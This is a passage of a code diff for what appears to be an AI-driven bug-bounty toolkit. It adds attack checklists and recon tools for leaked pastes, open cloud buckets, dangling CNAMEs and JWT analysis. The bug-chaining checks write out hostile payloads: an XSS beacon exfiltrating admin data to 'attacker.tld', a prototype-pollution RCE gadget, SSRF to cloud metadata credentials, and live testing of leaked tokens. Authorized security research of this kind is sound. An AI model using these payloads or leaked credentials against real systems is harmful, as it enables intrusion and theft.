 			"First 60s with a found key: aws sts get-caller-identity -> aws iam list-users -> list-attached-user-policies; GATE: a permissive IAM policy alone is not a finding — demonstrate an actual privileged action (read prod secret, create role)",
 			"Cognito: Identity Pool unauth role chain GetId -> GetCredentialsForIdentity -> IAM abuse; Lambda URLs (function URLs) public with POST handler bugs; Firebase realtime-db .json read",
-			"SSRF -> IMDS: AWS 169.254.169.254/latest/meta-data/iam/security-credentials/, IMDSv2 token-grab, GCP metadata.google.internal + Metadata-Flavor: Google, Azure 169.254.169.254/metadata/instance — see ssrf"
+			"SSRF -> IMDS: AWS 169.254.169.254/latest/meta-data/iam/security-credentials/, IMDSv2 token-grab, GCP metadata.google.internal + Metadata-Flavor: Google, Azure 169.254.169.254/metadata/instance — see ssrf",
+			"GCP storage XML listing; Firestore REST firestore.googleapis.com/v1/projects/<p>/databases/(default)/documents/<col>",
+			"Azure AD user enumeration IfExistsResult 0=exists 1=not-exists; Azure Function App URLs unauth",
+			"Dangling DNS provider registrars: *.s3.amazonaws.com, *.herokuapp.com, *.ghost.io, *.azurewebsites.net"
 		],
 		techniques: ["registry image pull", "GCS/Azure-blob anon", "48-pattern secret catalog", "sts get-caller-identity", "Cognito unauth role", "IMDS matrix"]
 	},
@@ -1506,7 +1665,11 @@ const CHECKLIST = [
 			"Reward accounting: grep -rn 'totalSupply|totalShares|totalAssets|totalDebt|cumulativeReward|rewardPerShare' contracts/ — invariant breaks (share inflation, donation attacks, first-depositor) hide here",
 			"Classic EVM bugs: reentrancy (non-CEII), oracle manipulation (TWAP window too short), flash-loan composability, permit/signature replay (EIP-2612), fee-on-transfer tokens vs precomputed balances",
 			"Immunefi bar: requires a Foundry PoC — a single forge test invocation proving the invariant break; no PoC = no payout",
-			"Access control: admin functions callable by anyone (onlyOwner typos), timelock bypass, upgradeable proxies with uninitialized implementations (UUPS initialize re-entry)"
+			"Access control: admin functions callable by anyone (onlyOwner typos), timelock bypass, upgradeable proxies with uninitialized implementations (UUPS initialize re-entry)",
+			"OWASP Smart Contract Top 10: access control ($953M lost 2024), business logic, oracle manipulation, flash loans, input validation, unchecked external calls, arithmetic, reentrancy ($35.7M), proxy/upgradeability",
+			"2024-25 classes: ERC4626 near-empty vault inflation, EIP-2612 permit frontrun DoS, signature replay across chains (recheck chainId in ecrecover), ZK proof-verifier bypass, if-vs-require modifier, donation attack, deploy-script/initializer re-init",
+			"Target scorecard >= 6/10 quality gate; hard kill signals: unverified contract, deployer rug history, <30 min contract age",
+			"8-class token rug grid: hidden mint (function mint/_mint/_balances[.]+=, delegatecall), honeypot (blacklist/isBlacklisted/maxTxAmount), fee manipulation (setFee/setSellFee/_isExcludedFromFee), LP drain (migrateLP/emergencyWithdraw/.sync()/setPair), bonding curve (virtualReserve/setCurve/graduate), authority retention (mint_authority/freeze_authority, is_mutable), fake renounce (renounceOwnership.*override/_shadowAdmin), sandwich/MEV (swapExactTokensForETH amountOutMin=0/rebase)"
 		],
 		techniques: ["TVL/audit kill gates", "mint/permanent_delegate rug", "reward invariant greps", "reentrancy/oracle checks", "Foundry forge test PoC", "proxy initialize bypass"]
 	},
@@ -1523,7 +1686,70 @@ const CHECKLIST = [
 			"Sector-specific: healthcare DICOM, finance SWIFT, ICS/SCADA Modbus/BACnet, kubelet/etcd exposure signals (see k8s-docker); vendor fingerprints from response headers and cookie sets"
 		],
 		techniques: ["48-pattern secret catalog", "identity-fabric mapping", "breach exact-domain match", "email->GitHub pivot", "favicon mmh3 dork", "sector OSCINT"]
-	}
+	},
+	{
+		slug: "leak-monitoring",
+		name: "Leak & Paste Monitoring",
+		description: "Continuous credential/secret leak monitoring across paste bins and breach feeds: keyless psbdmp search, paste dorks, exact-domain breach correlation and email pivots.",
+		checks: [
+			"psbdmp keyless search: GET https://psbdmp.ws/api/v3/search/<domain> (JSON) — paste dumps mentioning the target; cross-ref pastes with leaked cred pairs",
+			"Pastebin-family dorks: site:pastebin.com <domain>, site:gist.github.com <domain>, site:paste.ee <domain>, site:0bin.net <domain>, site:ghostbin.com <domain> — keep an eye via bin scrapers (psbdmp, pastebeen)",
+			"Breach correlation: HudsonRock / HIBP / DeHashed / IntelX — EXACT owned-domain match only (@target.com, never @siblingbrand.com); breach creds feed credential-stuffing and ATO chains (see password-reset-flaw)",
+			"Email -> GitHub-handle pivot: reverse-email lookup on leaked @<domain> to find employee repos; commit history reveals internal hostnames, deploy scripts, keys",
+			"Sweep repos/paste/gist dumps with rg over the secret catalog (see sensitive-data): aws_secret|stripe_(test|live)|sk_live_|xoxb-|github_token|ghp_|bearer\\s+[a-z0-9]+|password\\s*[:=]\\s*[\"\']",
+			"Live credential validation (minimal-impact): Slack curl -s -X POST https://slack.com/api/auth.test -H \"Authorization: Bearer $token\" -> ok:true = P1; AWS aws sts get-caller-identity"
+		],
+		techniques: ["psbdmp API", "paste dorks", "exact-domain breach match", "email->GitHub pivot", "secret rg sweep", "credential live-validation"]
+	},
+
+	{
+		slug: "bug-chaining",
+		name: "Bug Chaining & Chain Building",
+		description: "Cross-class chain templates triagers reward: privilege-boundary crossings, A->B pivot tables, chain valuation and conditional-kill logic.",
+		checks: [
+			"Chain template ASCII: [primary bug] -> [pivot] -> [final impact]; every real chain is a privilege-boundary crossing — single-class bugs chained across endpoints compound severity; report as ONE finding with combined severity, title [VulnA]+[VulnB]->[Impact]",
+			"XSS -> ATO beacon: fetch('/api/admin/users',{credentials:'include'}).then(r=>r.json()).then(d=>navigator.sendBeacon('https://attacker.tld/',JSON.stringify(d))) — works even with HttpOnly cookies",
+			"CSRF + IDOR -> mass ATO: CSRF on /api/email/change + IDOR PUT /api/users/:id -> every user's email reset to attacker's",
+			"Open redirect + OAuth prefix-check bypass: https://allowed.tld@evil.tld -> token/code leak (Referer + encoded redirect_uri); dangling-CNAME at OAuth redirect_uri = zero-interaction ATO",
+			"SSRF -> IMDS chain: SSRF to http://169.254.169.254/latest/meta-data/iam/security-credentials/<role> -> aws sts get-caller-identity (verify role)",
+			"Prototype pollution (client) -> RCE gadget: ?__proto__[shell]=true&__proto__[NODE_OPTIONS]=--require /tmp/x.js",
+			"Race condition + IDOR: accept a gift/friend-code twice (parallel requests), or self-promote via /api/admin/users/:id in parallel",
+			"LFI + File Upload (PHP-as-image) -> RCE: polyglot image with PHP payload, include it via LFI; subdomain takeover + CORS *.target.com + credentials -> exfil",
+			"Chain valuation: 'Open redirect -> OAuth code theft -> ATO' = report the chain; 'SSRF DNS-only -> internal service access' = data; a rate-limit regression is only complete once chained to brute-forceable impact"
+		],
+		techniques: ["privilege-boundary crossing", "XSS->ATO beacon", "CSRF+IDOR mass ATO", "OAuth prefix bypass", "SSRF->IMDS", "PP->RCE gadget", "race+IDOR", "LFI+upload->RCE", "conditional-kill chains"]
+	},
+
+	{
+		slug: "fuzzing-0day",
+		name: "Fuzzing & 0day Research",
+		description: "Coverage-guided fuzzing harnesses for binary/source 0day: honggfuzz/AFL/libFuzzer/Atheris one-liners, crash triage, and the CVE disclosure process.",
+		checks: [
+			"honggfuzz: honggfuzz -i corpus -o output -- ./target __FILE__ — files in corpus/ seed the input loop; crashes land in output/",
+			"AFL persistent-mode: afl-clang-fast++ -o target target.c then afl-fuzz -i in -o out -- ./target @@; use -m none for ASAN builds",
+			"libFuzzer: clang -fsanitize=fuzzer,address -o fuzz fuzz.c — the fuzzer writes the harness loop for you; run with -jobs=N -workers=N for parallelism",
+			"Python harness (Atheris): import atheris; fuzzer.Fuzz() with atheris.instrument_func on the parser entry — good for parsing-heavy Python/libs",
+			"Build with ASAN/UBSAN so memory bugs prove out: -fsanitize=address,undefined; triage crashes by dedup (same stack = same bug), then minimize with afl-tmin / libFuzzer -minimize_crash",
+			"CVE process: file via https://cveform.mitre.org/ and GitHub advisories (https://github.com/advisories); responsible disclosure window before public writeup",
+			"Scope note: binary fuzzing needs source/binaries in scope — for web targets, fuzz parsers behind the app (conv tools, image libs, doc renderers) reachable via upload/SSRF"
+		],
+		techniques: ["honggfuzz", "AFL persistent mode", "libFuzzer", "Atheris", "ASAN/UBSAN triage", "afl-tmin minimize", "CVE filing"]
+	},
+
+	{
+		slug: "timing-xsleaks",
+		name: "Timing Side-Channels & XS-Leaks",
+		description: "Non-constant-time comparison audits and cross-site information leaks: per-language timing-safe primitives, median-based oracles, and XS-Search/boolean/timing/error leaks.",
+		checks: [
+			"Non-constant-time comparison audit per language: JS/TS grep '.digest(' next to ==/=== on token|secret|hash|apiKey; Python == vs hmac.compare_digest/constant_time_compare; Go hmac.Equal/subtle.ConstantTimeCompare safe vs ==/bytes.Equal on secrets; Ruby ActiveSupport::SecurityUtils.secure_compare vs ==",
+			"KEY INSIGHT — inconsistency is proof: the target uses timingSafeEqual in 8/10 places but === in 2/10 -> audit the 2 inconsistent places first",
+			"Timing measurement: median of 50-100 alternating valid/invalid requests (Burp Sequencer or script); delta > 5ms or > 10% = timing oracle",
+			"Blind timing without source: compare valid vs invalid value timings; gate on stdev — delta > 2*max(stdev) before reporting an oracle",
+			"XS-Leaks: XS-Search boolean oracle (same-origin page presence), timing oracle, error oracle (status-code leak), window.name/length/postMessage-based oracles — chain with cross-site iframes"
+		],
+		techniques: ["timingSafeEqual audit", "median-of-50 timing oracle", "stdev gating", "XS-Search boolean", "error oracle", "postMessage oracle"]
+	},
+
 ];
 
 const SOURCE_AUDIT = {
@@ -2201,7 +2427,7 @@ const TOOLS = [
 	},
 	{
 		name: "bb_checklist",
-		description: "Bug bounty methodology checklist (75 categories: recon, IDOR/BAC, SSRF, auth, XSS, SQLi, business logic, API misconfig, subdomain takeover, CSRF/open redirect, file upload, engagement, reporting, registration-flows, actuator, js-recon, origin-ip, crlf-injection, host-header, rate-limit, 403-bypass, email-field, mass-assignment, punycode-idn, blind-xss, waf-bypass, framework-cves, github-recon, iis-fuzzing, nuclei-dast, s3-recon, swagger-api, wayback-mining, fuzz-pipeline, sqli-recon, open-redirect, cache-deception, wordpress, ct-monitor, url-collection, sensitive-data, lfi, cors, google-dorks, ssti-injection, xxe-injection, deserialization, jwt-attacks, graphql, http-smuggling, race-condition, nosql-injection, ldap-injection, oauth-sso, mfa-2fa-bypass, captcha-bypass, password-reset-flaw, session-management, source-leak, shadow-api, ntlm-info, grpc, websocket, dom-attacks, prototype-pollution, cache-poisoning, llm-ai, mobile-app, cloud-misconfig, k8s-docker, enterprise-platforms, cicd-supply-chain, web3-audit, offensive-osint). For source-code audit use bb_source_audit(language?). Unfiltered returns a compact index; pass a category slug/name for full checks and techniques.",
+		description: "Bug bounty methodology checklist (79 categories: recon, IDOR/BAC, SSRF, auth, XSS, SQLi, business logic, API misconfig, subdomain takeover, CSRF/open redirect, file upload, engagement, reporting, registration-flows, actuator, js-recon, origin-ip, crlf-injection, host-header, rate-limit, 403-bypass, email-field, mass-assignment, punycode-idn, blind-xss, waf-bypass, framework-cves, github-recon, iis-fuzzing, nuclei-dast, s3-recon, swagger-api, wayback-mining, fuzz-pipeline, sqli-recon, open-redirect, cache-deception, wordpress, ct-monitor, url-collection, sensitive-data, lfi, cors, google-dorks, ssti-injection, xxe-injection, deserialization, jwt-attacks, graphql, http-smuggling, race-condition, nosql-injection, ldap-injection, oauth-sso, mfa-2fa-bypass, captcha-bypass, password-reset-flaw, session-management, source-leak, shadow-api, ntlm-info, grpc, websocket, dom-attacks, prototype-pollution, cache-poisoning, llm-ai, mobile-app, cloud-misconfig, k8s-docker, enterprise-platforms, cicd-supply-chain, web3-audit, offensive-osint, leak-monitoring, bug-chaining, fuzzing-0day, timing-xsleaks). For source-code audit use bb_source_audit(language?). Unfiltered returns a compact index; pass a category slug/name for full checks and techniques.",
 		parameters: {
 			type: "object",
 			additionalProperties: false,
@@ -4711,6 +4937,648 @@ const TOOLS = [
 			return out;
 		}
 	},
+	{
+		name: "bb_jwt_analyze",
+		description: "Decode and analyze a JWT locally (pure compute, no cracking): base64url header/payload, flag alg:none, empty signature, kid/jku/x5u attack surface, exp missing/expired, and privilege/x-hasura claims. Authorized targets only.",
+		parameters: {
+			type: "object",
+			additionalProperties: false,
+			properties: {
+				token: { type: "string", description: "JWT token (3 dot-separated base64url segments)" }
+			},
+			required: ["token"]
+		},
+		output: {
+			schema: {
+				type: "object",
+				properties: {
+					token: { type: "string" },
+					header: { type: "object", properties: {}, additionalProperties: true },
+					payload: { type: "object", properties: {}, additionalProperties: true },
+					claims: { type: "array", items: { type: "string" } },
+					findings: { type: "array", items: { type: "object", properties: { severity: { type: "string" }, text: { type: "string" } }, required: ["severity", "text"], additionalProperties: false } },
+					note: { type: "string" }
+				},
+				required: ["token", "header", "payload", "claims", "findings", "note"],
+			},
+			render: (_args, v) =>
+				renderLines("🔑 bb_jwt_analyze", [
+					v.token.slice(0, 40) + (v.token.length > 40 ? "…" : ""),
+					"header: " + JSON.stringify(v.header),
+					"payload: " + JSON.stringify(v.payload),
+					v.claims.length ? "claims of interest: " + v.claims.join(" | ") : "",
+					"findings:",
+					...v.findings.map((f) => "[" + f.severity + "] " + f.text),
+					v.note ? "note: " + v.note : ""
+				].filter(Boolean))
+		},
+		timeoutMs: 5000,
+		isConcurrencySafe: () => true,
+		async execute(args, exec) {
+			const token = String(args.token || "").trim();
+			const out = { token, header: {}, payload: {}, claims: [], findings: [], note: "" };
+			try {
+				const b64url = (s) => {
+					try {
+						const b = s.replace(/-/g, "+").replace(/_/g, "/");
+						return JSON.parse(Buffer.from(b, "base64").toString("utf8"));
+					} catch {
+						return null;
+					}
+				};
+				const parts = token.split(".");
+				if (parts.length < 2) { out.note = "not a JWT: expected header.payload[.signature]"; return out; }
+				const header = b64url(parts[0]);
+				const payload = b64url(parts[1]);
+				if (!header || !payload) { out.note = "could not base64url-decode header/payload as JSON"; return out; }
+				out.header = header;
+				out.payload = payload;
+				const alg = String(header.alg || "");
+				const sig = parts.length > 2 ? parts[2] : "";
+				if (/^none$/i.test(alg) || !alg) out.findings.push({ severity: "CRIT", text: "alg is '" + alg + "' — jwt.verify({algorithms}) must reject none/other-than-signed" });
+				if (sig === "") out.findings.push({ severity: "HIGH", text: "signature segment empty — server must still verify; unsigned tokens = forge" });
+				if (header.kid !== undefined) out.findings.push({ severity: "MED", text: "kid present (" + String(header.kid).slice(0, 40) + ") — test path traversal / SQLi via kid, and key-confusion when alg switched" });
+				if (header.jku) out.findings.push({ severity: "MED", text: "jku present (" + String(header.jku).slice(0, 60) + ") — server may fetch attacker JWKS = SSRF/trust-chain bypass" });
+				if (header.x5u) out.findings.push({ severity: "MED", text: "x5u present — external cert URL may be attacker-controlled" });
+				const now = Math.floor(Date.now() / 1000);
+				if (payload.exp === undefined) out.findings.push({ severity: "LOW", text: "no exp claim — token never expires" });
+				else if (typeof payload.exp === "number" && payload.exp < now) out.findings.push({ severity: "MED", text: "exp " + payload.exp + " is in the past (now " + now + ") — server accepting it = replay surface" });
+				for (const k of Object.keys(payload)) {
+					const v = payload[k];
+					if (/^(role|roles|scope|user_id|uid|admin|is_admin|permissions|group|groups|tenant|org|account_type|verified)$/i.test(k)) out.claims.push(k + "=" + JSON.stringify(v));
+					if (/^x-hasura/i.test(k)) out.claims.push(k + "=" + JSON.stringify(v));
+				}
+				if (payload.role === "admin" || payload.is_admin === true || payload.verified === true) out.findings.push({ severity: "HIGH", text: "privileged claim set directly in token — test whether server trusts it" });
+				if (!out.findings.length) out.note = "no red flags; still test: RS256->HS256 confusion, kid file-read, jku SSRF, alg downgrade, exp/iat skew.";
+			} catch (e) {
+				out.error = shortErr(e);
+			}
+			return out;
+		}
+	},
+	{
+		name: "bb_cloud_storage_scan",
+		description: "Probe derived bucket names for open/listable Azure Blob, GCP Storage and Firebase RTDB backends: GET-only listing checks (?comp=list / ListBucketResult / .json). Keyless: direct HTTP.",
+		parameters: {
+			type: "object",
+			additionalProperties: false,
+			properties: {
+				domain: { type: "string", description: "Domain/company name to derive bucket names from, e.g. example.com" }
+			},
+			required: ["domain"]
+		},
+		output: {
+			schema: {
+				type: "object",
+				properties: {
+					domain: { type: "string" },
+					azure: { type: "array", items: { type: "string" } },
+					gcp: { type: "array", items: { type: "string" } },
+					firebase: { type: "array", items: { type: "string" } },
+					checked: { type: "integer" },
+					note: { type: "string" }
+				},
+				required: ["domain", "azure", "gcp", "firebase", "checked", "note"],
+			},
+			render: (_args, v) =>
+				renderLines("☁️ bb_cloud_storage_scan", [
+					"domain: " + v.domain + " (" + v.checked + " names probed)",
+					"open Azure Blob: " + (v.azure.length ? v.azure.join(", ") : "none"),
+					"open GCP buckets: " + (v.gcp.length ? v.gcp.join(", ") : "none"),
+					"open Firebase: " + (v.firebase.length ? v.firebase.join(", ") : "none"),
+					v.note ? "note: " + v.note : ""
+				].filter(Boolean))
+		},
+		timeoutMs: 90000,
+		isConcurrencySafe: () => true,
+		async execute(args, exec) {
+			const d = normalizeDomain(args.domain);
+			const out = { domain: d, azure: [], gcp: [], firebase: [], checked: 0, note: "" };
+			try {
+				const stem = d.split(".")[0];
+				const names = uniq([
+					d, d + "-backup", d + "-bak", d + "-assets", d + "-static", d + "-data", d + "-uploads",
+					d + "-prod", d + "-dev", d + "-test", d + "-media", d + "-files", d + "-public",
+					"backup-" + d, "assets-" + d, "uploads-" + d, "media-" + d, "static-" + d, "data-" + d,
+					"s3-" + d, "s3-" + stem, stem + "-s3", stem + "-bucket", stem + "-storage", stem + "-backup",
+					stem + "-files", stem + "-uploads", stem,
+				]);
+				await mapPool(names, 6, async (name) => {
+					out.checked++;
+					// Azure Blob: ?comp=list returns <EnumerationResults> when public
+					try {
+						const { res } = await fetchRes("https://" + name + ".blob.core.windows.net/?comp=list", exec, { budget: 10000 });
+						const body = await readLimited(res, 800);
+						if (res.status === 200 && /<EnumerationResults/i.test(body) && !out.azure.includes(name)) out.azure.push(name);
+					} catch {
+						// ignore
+					}
+					// GCP Storage: /<bucket>/ returns <ListBucketResult> when public
+					try {
+						const { res } = await fetchRes("https://storage.googleapis.com/" + name + "/", exec, { budget: 10000 });
+						const body = await readLimited(res, 800);
+						if (res.status === 200 && /<ListBucketResult/i.test(body) && !out.gcp.includes(name)) out.gcp.push(name);
+					} catch {
+						// ignore
+					}
+					// Firebase RTDB: {name}.firebaseio.com/.json returns data when rules open
+					try {
+						const { res } = await fetchRes("https://" + name + ".firebaseio.com/.json", exec, { budget: 10000 });
+						const body = await readLimited(res, 400);
+						if (res.status === 200 && /^[\[{]/.test(body.trim()) && !out.firebase.includes(name)) out.firebase.push(name);
+					} catch {
+						// ignore
+					}
+				});
+				if (!out.azure.length && !out.gcp.length && !out.firebase.length) out.note = "no open storage found on derived names; try bb_wayback_urls for bucket URLs and src-leak for configs.";
+			} catch (e) {
+				out.error = shortErr(e);
+			}
+			return out;
+		}
+	},
+	{
+		name: "bb_psbdmp_search",
+		description: "Keyless paste-dump search: query psbdmp.ws (33 paste sites archive) for a domain/email and fetch matching dump contents to find leaked credentials/secrets. Pass only targets you are authorized to investigate.",
+		parameters: {
+			type: "object",
+			additionalProperties: false,
+			properties: {
+				query: { type: "string", description: "Domain or email to search, e.g. example.com or user@example.com" },
+				limit: { type: "integer", description: "Max dumps to fetch content for (default 3)" }
+			},
+			required: ["query"]
+		},
+		output: {
+			schema: {
+				type: "object",
+				properties: {
+					query: { type: "string" },
+					total: { type: "integer" },
+					dumps: { type: "array", items: { type: "object", properties: { id: { type: "string" }, tags: { type: "array", items: { type: "string" } }, snippet: { type: "string" } }, required: ["id", "tags", "snippet"], additionalProperties: false } },
+					note: { type: "string" }
+				},
+				required: ["query", "total", "dumps", "note"],
+			},
+			render: (_args, v) =>
+				renderLines("📄 bb_psbdmp_search", [
+					"query: " + v.query + " (" + v.total + " pastes)",
+					"matching dumps:",
+					...(v.dumps.length ? v.dumps.map((x) => "id " + x.id + " [" + (x.tags || []).join(",") + "]: " + (x.snippet || "").replace(/\s+/g, " ").slice(0, 180)) : ["none"]),
+					v.note ? "note: " + v.note : ""
+				].filter(Boolean))
+		},
+		timeoutMs: 30000,
+		isConcurrencySafe: () => true,
+		async execute(args, exec) {
+			const q = String(args.query || "").trim();
+			const out = { query: q, total: 0, dumps: [], note: "" };
+			try {
+				if (!q) { out.note = "provide a domain or email query"; return out; }
+				const { text } = await fetchText("https://psbdmp.ws/api/v3/search/" + encodeURIComponent(q), exec, { budget: 15000, headers: { accept: "application/json" } });
+				let data;
+				try { data = JSON.parse(text || "{}"); } catch { data = {}; }
+				const list = Array.isArray(data.data) ? data.data : Array.isArray(data) ? data : [];
+				out.total = list.length;
+				const cap = Math.min(parseInt(args.limit || 3, 10), 8);
+				const ids = list.map((x) => String(x.id || "")).filter(Boolean).slice(0, cap);
+				await mapPool(ids, 3, async (id) => {
+					try {
+						const { text: dt } = await fetchText("https://psbdmp.ws/api/v3/dump/" + encodeURIComponent(id), exec, { budget: 15000, headers: { accept: "application/json" } });
+						let dj;
+						try { dj = JSON.parse(dt || "{}"); } catch { dj = {}; }
+						const content = String((dj.data && (dj.data.content || dj.data.text)) || dj.content || "");
+						const tags = Array.isArray(dj.data && dj.data.tags) ? dj.data.tags : [];
+						out.dumps.push({ id, tags: tags.map(String).slice(0, 6), snippet: content.slice(0, 500) });
+					} catch {
+						out.dumps.push({ id, tags: [], snippet: "" });
+					}
+				});
+				if (!out.total) out.note = "no pastes found; broaden query (email prefix, base domain) — psbdmp is rate-limited, expect occasional timeouts.";
+			} catch (e) {
+				out.error = shortErr(e);
+			}
+			return out;
+		}
+	},
+	{
+		name: "bb_dockerhub_search",
+		description: "Keyless Docker Hub API recon: search repositories under an org/company and list latest tags — leaked internal images, hardcoded secrets in build layers, abandoned orgs. GET-only.",
+		parameters: {
+			type: "object",
+			additionalProperties: false,
+			properties: {
+				org: { type: "string", description: "Docker Hub org / namespace or search query, e.g. examplecorp" },
+				limit: { type: "integer", description: "Max repos (default 15)" }
+			},
+			required: ["org"]
+		},
+		output: {
+			schema: {
+				type: "object",
+				properties: {
+					org: { type: "string" },
+					repos: { type: "array", items: { type: "object", properties: { name: { type: "string" }, description: { type: "string" }, stars: { type: "integer" }, tags: { type: "array", items: { type: "string" } } }, required: ["name", "description", "stars", "tags"], additionalProperties: false } },
+					note: { type: "string" }
+				},
+				required: ["org", "repos", "note"],
+			},
+			render: (_args, v) =>
+				renderLines("🐳 bb_dockerhub_search", [
+					"org: " + v.org,
+					...(v.repos.length ? v.repos.map((r) => r.name + " ⭐" + r.stars + (r.description ? " — " + r.description.slice(0, 90) : "") + (r.tags.length ? "  tags: " + r.tags.join(", ") : "")) : ["no repos found"]),
+					v.note ? "note: " + v.note : ""
+				].filter(Boolean))
+		},
+		timeoutMs: 45000,
+		isConcurrencySafe: () => true,
+		async execute(args, exec) {
+			const org = String(args.org || "").trim();
+			const out = { org, repos: [], note: "" };
+			try {
+				const limit = Math.min(parseInt(args.limit || 15, 10), 40);
+				const { text } = await fetchText("https://hub.docker.com/v2/search/repositories/?query=" + encodeURIComponent(org) + "&page_size=25", exec, { budget: 15000, headers: { accept: "application/json" } });
+				let data;
+				try { data = JSON.parse(text || "{}"); } catch { data = {}; }
+				const results = Array.isArray(data.results) ? data.results : [];
+				for (const r of results.slice(0, limit)) {
+					const name = String(r.repo_name || "");
+					if (!name) continue;
+					const full = name.split("/");
+					const ns = full.length > 1 ? full[0] : "";
+					if (ns && ns !== org && !name.toLowerCase().includes(org.toLowerCase()) && !r.is_official) continue;
+					out.repos.push({ name, description: String(r.short_description || ""), stars: r.star_count || 0, tags: [] });
+				}
+				// fetch latest tags for the top repos
+				await mapPool(out.repos.slice(0, 8), 4, async (repo) => {
+					try {
+						const { text: tt } = await fetchText("https://hub.docker.com/v2/repositories/" + repo.name + "/tags/?page_size=6", exec, { budget: 10000, headers: { accept: "application/json" } });
+						let td;
+						try { td = JSON.parse(tt || "{}"); } catch { td = {}; }
+						repo.tags = (Array.isArray(td.results) ? td.results : []).map((t) => String(t.name || "")).slice(0, 6);
+					} catch {
+						// tags optional
+					}
+				});
+				if (!out.repos.length) out.note = "no repos for '" + org + "'; try a shorter company name or search query.";
+			} catch (e) {
+				out.error = shortErr(e);
+			}
+			return out;
+		}
+	},
+	{
+		name: "bb_dangling_cname",
+		description: "Find dangling CNAMEs: crt.sh subdomains -> DNS-over-HTTPS CNAME lookup -> NXDOMAIN check; flags CNAMEs aimed at third-party takeover services (S3, Azure, CloudFront, Heroku, Netlify, GitHub Pages...). Keyless: crt.sh + DoH.",
+		parameters: {
+			type: "object",
+			additionalProperties: false,
+			properties: {
+				domain: { type: "string", description: "Root domain, e.g. example.com" },
+				limit: { type: "integer", description: "Max subdomains to check (default 40)" }
+			},
+			required: ["domain"]
+		},
+		output: {
+			schema: {
+				type: "object",
+				properties: {
+					domain: { type: "string" },
+					checked: { type: "integer" },
+					dangling: { type: "array", items: { type: "object", properties: { sub: { type: "string" }, cname: { type: "string" }, note: { type: "string" } }, required: ["sub", "cname", "note"], additionalProperties: false } },
+					note: { type: "string" }
+				},
+				required: ["domain", "checked", "dangling", "note"],
+			},
+			render: (_args, v) =>
+				renderLines("🧲 bb_dangling_cname", [
+					"domain: " + v.domain + " (" + v.checked + " subs checked)",
+					...(v.dangling.length ? v.dangling.map((x) => x.sub + " -> " + x.cname + "  [" + x.note + "]") : ["no dangling CNAMEs found"]),
+					v.note ? "note: " + v.note : ""
+				].filter(Boolean))
+		},
+		timeoutMs: 60000,
+		isConcurrencySafe: () => true,
+		async execute(args, exec) {
+			const d = normalizeDomain(args.domain);
+			const out = { domain: d, checked: 0, dangling: [], note: "" };
+			const TAKEOVER = /(s3[\w.-]*\.amazonaws\.com|blob\.core\.windows\.net|\.cloudfront\.net|herokuapp\.com|\.ghost\.io|\.netlify\.app|\.surge\.sh|\.readme\.io|github\.io|\.fastly\.net|\.zendesk\.com|\.vercel\.app|\.azurewebsites\.net|\.firebaseio\.com|\.myshopify\.com)/i;
+			try {
+				const limit = Math.min(parseInt(args.limit || 40, 10), 80);
+				const { text } = await fetchText("https://crt.sh/?q=%25." + encodeURIComponent(d) + "&output=json", exec, { budget: 30000, headers: { accept: "application/json" } });
+				let rows;
+				try { rows = JSON.parse(text || "[]"); } catch { rows = []; }
+				const subs = uniq((Array.isArray(rows) ? rows : []).flatMap((r) => String(r.name_value || "").split(/\s+/)).map((s) => String(s).trim().toLowerCase()).filter((s) => s && !s.startsWith("*") && s.endsWith("." + d))).slice(0, limit);
+				await mapPool(subs, 6, async (sub) => {
+					out.checked++;
+					try {
+						const { text: cj } = await fetchText("https://cloudflare-dns.com/dns-query?name=" + encodeURIComponent(sub) + "&type=CNAME", exec, { budget: 8000, headers: { accept: "application/dns-json" } });
+						let j;
+						try { j = JSON.parse(cj || "{}"); } catch { j = {}; }
+						const answers = Array.isArray(j.Answer) ? j.Answer : [];
+						const cname = answers.find((a) => a.type === 5 && typeof a.data === "string");
+						if (!cname) return;
+						const target = String(cname.data).replace(/\.$/, "");
+						// NXDOMAIN check on the CNAME target via A lookup
+						let nx = false;
+						try {
+							const { text: aj } = await fetchText("https://cloudflare-dns.com/dns-query?name=" + encodeURIComponent(target) + "&type=A", exec, { budget: 8000, headers: { accept: "application/dns-json" } });
+							const ajj = JSON.parse(aj || "{}");
+							nx = ajj.Status === 3 || (Array.isArray(ajj.Answer) && !ajj.Answer.length);
+						} catch {
+							nx = false;
+						}
+						const takeoverable = TAKEOVER.test(target);
+						if (nx && takeoverable) out.dangling.push({ sub, cname: target, note: "NXDOMAIN + takeover-able service (" + (target.match(TAKEOVER) || [""])[0] + ") — verify claim vector (see subdomain-takeover checklist)" });
+						else if (nx) out.dangling.push({ sub, cname: target, note: "NXDOMAIN but not an auto-claim service; manual takeover check" });
+					} catch {
+						// individual sub failures ignored
+					}
+				});
+				if (!out.checked) out.note = "no subdomains from crt.sh; try the root/wildcard-scope domain.";
+			} catch (e) {
+				out.error = shortErr(e);
+			}
+			return out;
+		}
+	},
+	{
+		name: "bb_dns_wildcard_probe",
+		description: "Detect wildcard DNS: resolve 3 random labels under the domain via DNS-over-HTTPS; identical IP sets across random labels = wildcard (subdomain-enumeration false positives). Keyless: DoH.",
+		parameters: {
+			type: "object",
+			additionalProperties: false,
+			properties: {
+				domain: { type: "string", description: "Domain to probe, e.g. example.com" }
+			},
+			required: ["domain"]
+		},
+		output: {
+			schema: {
+				type: "object",
+				properties: {
+					domain: { type: "string" },
+					labels: { type: "array", items: { type: "object", properties: { label: { type: "string" }, ips: { type: "array", items: { type: "string" } }, status: { type: "integer" } }, required: ["label", "ips", "status"], additionalProperties: false } },
+					wildcard: { type: "boolean" },
+					note: { type: "string" }
+				},
+				required: ["domain", "labels", "wildcard", "note"],
+			},
+			render: (_args, v) =>
+				renderLines("🌀 bb_dns_wildcard_probe", [
+					"domain: " + v.domain + (v.wildcard ? " — ⚠️ WILDCARD DNS" : " — no wildcard detected"),
+					...(v.labels.map((l) => l.label + " -> " + (l.ips.length ? l.ips.join(",") : "(no A)") + " (status " + l.status + ")")),
+					v.note ? "note: " + v.note : ""
+				].filter(Boolean))
+		},
+		timeoutMs: 25000,
+		isConcurrencySafe: () => true,
+		async execute(args, exec) {
+			const d = normalizeDomain(args.domain);
+			const out = { domain: d, labels: [], wildcard: false, note: "" };
+			try {
+				const rnd = () => "zz" + Math.random().toString(36).slice(2, 10);
+				const labels = [rnd(), rnd(), rnd()];
+				const ipSets = [];
+				await mapPool(labels, 3, async (lbl) => {
+					const fqdn = lbl + "." + d;
+					try {
+						const { text } = await fetchText("https://cloudflare-dns.com/dns-query?name=" + encodeURIComponent(fqdn) + "&type=A", exec, { budget: 8000, headers: { accept: "application/dns-json" } });
+						const j = JSON.parse(text || "{}");
